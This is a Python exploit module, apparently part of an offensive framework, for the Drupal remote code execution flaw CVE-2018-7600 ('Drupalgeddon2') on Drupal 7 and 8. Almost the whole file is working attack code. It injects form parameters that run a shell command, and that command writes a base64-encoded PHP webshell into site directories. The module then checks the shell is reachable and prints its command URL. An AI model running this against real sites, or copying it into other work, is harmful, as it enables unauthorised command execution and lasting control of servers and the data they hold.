import math
import random
import re
import string

from exploits.ACVE import ACVE

__author__ = "Jean Lejeune <jlejeune@immunit.ch>"
__copyright__ = "Copyright 2018, ImmunIT"
__credit__ = "https://www.exploit-db.com/exploits/44449/"


class Exploit(ACVE):
    """This class tries exploit the CVE-2018-7600.
    """

    def __init__(self, request, target, logger):
        self.request = request
        self.target = target
        self.logger = logger
        self.cmd = "echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee "
        self.paths = ["./", "./sites/default/", "./sites/default/files/"]

    def run(self, version):
        for path in self.paths:
            endpoint = path + self._generateRandomString() + ".php"
            payload = self._generatePayload(endpoint, version)
            self.request.post(payload[1], payload[0])

            if self.request.get("/" + endpoint).status_code == 200:
                self.logger.handle(("\n[+] Exploit completed. Webshell accessible at: " + self.target + "/" + endpoint + "?c=CMD").replace("./", ""), self.logger.SUCCESS)
                return

        self.logger.handle("\n[-] Exploit failed", self.logger.ERROR)

    def _generateRandomString(self, size=6, chars=string.ascii_uppercase + string.digits):
        """Generates random string.

        Return
        ------
        Random string.
        """

        return ''.join(random.choice(chars) for _ in range(size))

    def _generatePayload(self, endpoint, version):
        """Generates the payload associated to the given version.

        Parameters
        ----------
        endpoint : str
            Dropping location
        version : float
            Drupal version

        Return
        ------
        The URL and the payload to inject.
        """

        if math.floor(version) == 8:
            url = '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=" + self.cmd + endpoint
        elif math.floor(version) == 7:
            url = '?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=' + self.cmd + endpoint
            payload = "form_id=user_pass&_triggering_element_name=name"

            tmp = self.request.post(payload, url)
            if tmp.status_code == 200:
                content = str(tmp.content.decode("utf-8"))
                lines = content.split("\n")
                for line in lines:
                    if "type=\"hidden\" name=\"form_build_id\"" in line:
                        match = re.search('value="(.*)"', line)
                        value = match.group(1)
                        break

            url = '?q=file/ajax/name/%23value/' + value
            payload = 'form_build_id=' + value

        return (url, payload)
